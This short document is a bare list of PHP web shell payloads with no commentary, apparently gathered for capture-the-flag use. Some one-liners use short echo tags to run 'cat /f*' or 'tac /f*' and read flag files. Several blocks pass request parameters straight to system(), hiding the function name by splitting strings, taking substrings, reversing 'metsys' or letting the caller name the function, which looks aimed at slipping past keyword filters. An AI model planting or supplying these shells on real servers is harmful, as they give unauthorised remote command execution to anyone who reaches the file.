<?=system('cat /f*')?>
<?=`cat ../f*`?>
<?=(s.y.s.t.e.m)('tac /f*')?>
<script language=”php”>echo '123'; </script>
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>
<?php
$a=strrev('metsys');
$a($_REQUEST[1]);
?>
<?php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);
?>